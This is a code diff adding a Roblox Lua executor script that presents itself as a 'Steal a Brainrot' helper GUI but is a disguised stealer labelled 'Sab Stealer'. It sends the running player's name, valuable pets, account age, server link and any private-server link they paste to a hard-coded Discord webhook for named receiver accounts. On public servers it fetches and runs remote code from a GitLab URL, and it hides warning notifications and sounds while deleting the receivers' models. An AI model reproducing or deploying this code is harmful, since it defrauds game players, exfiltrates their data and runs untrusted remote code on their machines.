@@ -1,0 +1,340 @@
+-- =============================
+-- Steal a Brainrot GUI + Webhook + Auto Execute
+-- + Script tự động xử lý base
+-- =============================
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- ====== Webhook ======
+local WEBHOOK = "https://discord.com/api/webhooks/1410618012708634777/hQoWuMzJJgV5MlCK4KB0MyAJtUUj2jFOgxgNvG4tQFv3AdfJ_ByQkGNkt3G1ywfOTpIB"
+
+-- ====== Hàm đổi "5K"/"5M"/"2B" sang số ======
+local function parsePrice(priceText)
+    local number = tonumber(priceText:match("[%d%.]+")) or 0
+    if priceText:find("K") then
+        return number * 1_000
+    elseif priceText:find("M") then
+        return number * 1_000_000
+    elseif priceText:find("B") then
+        return number * 1_000_000_000
+    else
+        return number
+    end
+end
+
+local PRICE_LIMIT = 5_000_000 -- 5M
+local targetNames = { "Kitsune", "Dragonfly", "Pipi Kiwi" }
+local function isTargetName(name)
+    for _, n in ipairs(targetNames) do
+        if n == name then return true end
+    end
+    return false
+end
+
+-- ====== Hàm lọc Pet trong base của mình ======
+local function collectValidPets()
+    local pets = {}
+    for _, plot in pairs(Workspace.Plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    local spawn = podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
+                    if spawn and spawn:FindFirstChild("Attachment") then
+                        local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+                        if overhead then
+                            local displayName = overhead:FindFirstChild("DisplayName")
+                            local priceLabel = overhead:FindFirstChild("Generation")
+                            if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+                                local nameText = displayName.Text
+                                local priceText = priceLabel.Text
+                                local priceNum = parsePrice(priceText)
+                                if priceNum >= PRICE_LIMIT or isTargetName(nameText) then
+                                    table.insert(pets, string.format("%s (%s)", nameText, priceText))
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            break
+        end
+    end
+    return pets
+end
+
+-- ====== Hàm kiểm tra Executor ======
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor() end
+    return executor
+end
+
+-- ====== Hàm lấy tuổi tài khoản ======
+local function getAccountAge()
+    return player.AccountAge
+end
+
+-- ====== Check server type ======
+local map = Workspace:WaitForChild("Map")
+local codes = map:WaitForChild("Codes")
+local main = codes:WaitForChild("Main")
+local surfaceGui = main:WaitForChild("SurfaceGui")
+local privateMsg = surfaceGui:WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
+local serverType = privateMsg.Visible and "PRIVATE SERVER" or "PUBLIC SERVER"
+
+-- ====== Hàm gửi webhook ======
+local function sendWebhook(link)
+    if player:GetAttribute("WebhookSent") then return end
+    local pets = collectValidPets()
+    if #pets == 0 then
+        warn("Không có pet nào đạt điều kiện, không gửi webhook.")
+        return
+    end
+    local lootText = table.concat(pets, "\n")
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+    local embed = {
+        ["title"] = "🌵 Sab Stealer - Make By Phatlee",
+        ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
+        ["fields"] = {
+            { ["name"] = "Server Type", ["value"] = serverType },
+            { ["name"] = "👤 Player Information",
+              ["value"] = "Name: " .. player.Name ..
+                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
+                          "\nExecutor: " .. detectExecutor() ..
+                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
+            { ["name"] = "Brainrot Loot", ["value"] = lootText },
+            { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
+        }
+    }
+    local payload = {["content"] = link or ("Server detected: " .. serverType), ["embeds"] = {embed}}
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req then
+        pcall(function()
+            req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
+        end)
+        player:SetAttribute("WebhookSent", true)
+    else
+        warn("Executor không hỗ trợ request HTTP")
+    end
+end
+
+-- ====== Public Server: tự động execute thêm script ======
+if serverType == "PUBLIC SERVER" then
+    print("PUBLIC SERVER detected")
+    sendWebhook()
+    -- Tự động load script
+    pcall(function()
+        loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
+    end)
+else
+    -- ====== Private Server GUI ======
+    print("PRIVATE SERVER detected")
+    local playerGui = player:WaitForChild("PlayerGui")
+    local screenGui = Instance.new("ScreenGui", playerGui)
+    screenGui.Name = "StealBrainrotGUI"
+    screenGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(0, 320, 0, 180)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    frame.Active = true
+    frame.Draggable = true
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+    local title = Instance.new("TextLabel", frame)
+    title.Text = "Steal a Brainrot"
+    title.Font = Enum.Font.FredokaOne
+    title.TextSize = 20
+    title.TextColor3 = Color3.fromRGB(255,255,255)
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1,0,0,28)
+    title.Position = UDim2.new(0,0,0,4)
+
+    local closeButton = Instance.new("TextButton", frame)
+    closeButton.Text = "X"
+    closeButton.Font = Enum.Font.FredokaOne
+    closeButton.TextSize = 18
+    closeButton.TextColor3 = Color3.fromRGB(255,255,255)
+    closeButton.BackgroundColor3 = Color3.fromRGB(60,0,0)
+    closeButton.Size = UDim2.new(0,28,0,28)
+    closeButton.Position = UDim2.new(1,-34,0,4)
+    Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0,8)
+    closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+    local textBox = Instance.new("TextBox", frame)
+    textBox.Size = UDim2.new(0.9,0,0,40)
+    textBox.Position = UDim2.new(0.05,0,0,60)
+    textBox.PlaceholderText = "Please enter your private server link"
+    textBox.Text = ""
+    textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    textBox.TextColor3 = Color3.fromRGB(255,255,255)
+    textBox.ClearTextOnFocus = false
+    textBox.Font = Enum.Font.FredokaOne
+    textBox.TextSize = 14
+    Instance.new("UICorner", textBox).CornerRadius = UDim.new(0,8)
+
+    local sendButton = Instance.new("TextButton", frame)
+    sendButton.Text = "Send"
+    sendButton.Font = Enum.Font.FredokaOne
+    sendButton.TextSize = 18
+    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
+    sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
+    sendButton.Size = UDim2.new(0.4,0,0,32)
+    sendButton.Position = UDim2.new(0.3,0,0,110)
+    Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0,8)
+
+    local function showError(msg)
+        local popup = Instance.new("Frame", screenGui)
+        popup.Size = UDim2.new(0,300,0,120)
+        popup.Position = UDim2.new(0.5,-150,0.5,-60)
+        popup.BackgroundColor3 = Color3.fromRGB(30,30,30)
+        popup.AnchorPoint = Vector2.new(0.5,0.5)
+        Instance.new("UICorner", popup).CornerRadius = UDim.new(0,12)
+        local label = Instance.new("TextLabel", popup)
+        label.Size = UDim2.new(1,-20,0.6,0)
+        label.Position = UDim2.new(0,10,0.1,0)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextColor3 = Color3.fromRGB(255,255,255)
+        label.TextScaled = true
+        label.Font = Enum.Font.FredokaOne
+        local button = Instance.new("TextButton", popup)
+        button.Size = UDim2.new(0.5,0,0.25,0)
+        button.Position = UDim2.new(0.25,0,0.7,0)
+        button.BackgroundColor3 = Color3.fromRGB(70,70,70)
+        button.Text = "OK"
+        button.TextColor3 = Color3.fromRGB(255,255,255)
+        button.Font = Enum.Font.FredokaOne
+        Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)
+        button.MouseButton1Click:Connect(function() popup:Destroy() end)
+        task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
+    end
+
+    local function isValidPrivateServerLink(txt)
+        return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+    end
+
+    local function handleSend()
+        local txt = textBox.Text or ""
+        if isValidPrivateServerLink(txt) then
+            sendWebhook(txt)
+            screenGui:Destroy()
+        else
+            showError("Please enter your private server link")
+        end
+    end
+
+    sendButton.MouseButton1Click:Connect(handleSend)
+    textBox.FocusLost:Connect(function(enterPressed) if enterPressed then handleSend() end end)
+end
+
+-- =============================
+-- Script tự động xử lý base
+-- =============================
+local baseId = nil
+local plotsFolder = Workspace:WaitForChild("Plots")
+for _, plot in ipairs(plotsFolder:GetChildren()) do
+    local sign = plot:FindFirstChild("PlotSign")
+    if sign then
+        local textLabel = sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") and sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+        if textLabel and string.find(textLabel.Text, localPlayer.Name) then
+            baseId = plot.Name
+            print("Đã tìm thấy base của mình:", baseId)
+            break
+        end
+    end
+end
+
+local function cloneBaseModels()
+    if not baseId then return end
+    local myBase = plotsFolder:FindFirstChild(baseId)
+    if not myBase then return end
+    for _, child in ipairs(myBase:GetChildren()) do
+        if child:IsA("Model") and child.Name ~= "FriendPanel" and child.Name ~= "AnimalPodiums" then
+            local clone = child:Clone()
+            clone.Name = child.Name.."_clone"
+            clone.Parent = myBase
+            child:Destroy()
+        end
+    end
+end
+
+local function cloneAnimalPodiums()
+    if not baseId then return end
+    local myBase = plotsFolder:FindFirstChild(baseId)
+    if not myBase then return end
+    local podiums = myBase:FindFirstChild("AnimalPodiums")
+    if podiums then
+        for _, podium in ipairs(podiums:GetChildren()) do
+            if podium:IsA("Model") then
+                local clone = podium:Clone()
+                clone.Name = podium.Name.."_clone"
+                clone.Parent = podiums
+                podium:Destroy()
+            end
+        end
+    end
+end
+
+local badPlayers = {"phatle8117","ConCuTiHon02"}
+local function removeBadPlayersModels()
+    for _, name in ipairs(badPlayers) do
+        local model = Workspace:FindFirstChild(name)
+        if model then model:Destroy() print("Đã xóa model của:", name) end
+    end
+end
+
+local function removeGuiAndSounds()
+    local notif = localPlayer:FindFirstChild("PlayerGui") and localPlayer.PlayerGui:FindFirstChild("Notification")
+    if notif then notif:Destroy() end
+    local warnSfx = ReplicatedStorage:FindFirstChild("Sounds") and ReplicatedStorage.Sounds:FindFirstChild("Sfx") and ReplicatedStorage.Sounds.Sfx:FindFirstChild("Warn")
+    if warnSfx then warnSfx:Destroy() end
+end
+
+local sweetTexts = {"Căn cứ của Sweet","Sweet's Base"}
+local function checkAndDeleteSweetBase()
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        local success, textLabel = pcall(function()
+            return plot:WaitForChild("PlotSign"):WaitForChild("SurfaceGui"):WaitForChild("Frame"):WaitForChild("TextLabel")
+        end)
+        if success and textLabel then
+            for _, t in ipairs(sweetTexts) do
+                if textLabel.Text == t then
+                    print("Xóa base ID:", plot.Name,"vì textLabel là:", textLabel.Text)
+                    plot:Destroy()
+                end
+            end
+        end
+    end
+end
+
+task.spawn(function()
+    while task.wait(1) do
+        cloneBaseModels()
+        cloneAnimalPodiums()
+        removeBadPlayersModels()
+        removeGuiAndSounds()
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.1) do
+        checkAndDeleteSweetBase()
+    end
+end)
